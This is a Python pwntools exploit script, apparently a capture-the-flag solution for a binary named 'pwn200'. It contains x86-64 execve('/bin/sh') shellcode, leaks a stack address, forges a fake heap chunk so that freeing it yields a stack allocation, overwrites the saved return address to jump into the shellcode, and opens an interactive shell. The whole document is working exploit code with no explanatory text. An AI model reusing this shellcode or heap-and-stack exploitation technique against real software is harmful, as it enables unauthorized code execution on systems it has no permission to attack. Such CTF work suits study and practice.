from pwn import *

if True:
    #context.log_level = 'debug'
    p = process('./pwn200')
else:
    p = remote('127.0.0.1', 12345)

def leak_stack_addr():
    shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"\
    +"\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
    # leak stacK
    fake = shellcode + 'A'*(0x30-len(shellcode))
    p.write(fake)
    print fake
    p.recvuntil('A'*(0x30-len(shellcode)))
    stack_str = p.recvuntil(',').replace(',', '')
    stack_str = u64(stack_str + chr(0)*(0x08 - len(stack_str)))
    print "ebp address:", hex(stack_str)
    return stack_str-0xb0
    

stack_addr = leak_stack_addr()  # 这里的stack_addr到了
print "stack address:", hex(stack_addr)
p.recvuntil('id ~~?')
p.sendline(str(0x20))

p.recvuntil('money~')
fake_chunk = 'A'*0x8
fake_chunk += p64(0x61)
fake_chunk += 'A'*0x28
fake_chunk += p64(stack_addr)
p.send(fake_chunk)

p.recvuntil('choice : ')
raw_input('free?')
p.send(str(2)+'\n')

p.recvuntil('choice : ')
raw_input('write?')
payload  = 'A' * 0x38
payload += p64(stack_addr+0x60)        # return to shellcode
payload += 'B'*0x10
p.sendline(str(1))
p.sendline(str(0x50))
p.send(payload)

p.recvuntil('in~')
p.sendline(str(3))
p.interactive()


